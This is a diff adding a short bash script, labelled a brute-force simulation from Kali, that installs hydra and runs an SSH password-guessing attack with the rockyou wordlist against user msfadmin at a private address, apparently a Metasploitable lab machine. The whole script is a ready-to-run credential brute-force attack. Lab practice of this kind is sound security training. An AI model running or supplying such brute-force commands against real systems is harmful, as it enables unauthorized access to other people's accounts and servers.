@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+# Brute-force simulation (from Kali)
+
+sudo apt install hydra -y
+hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.102
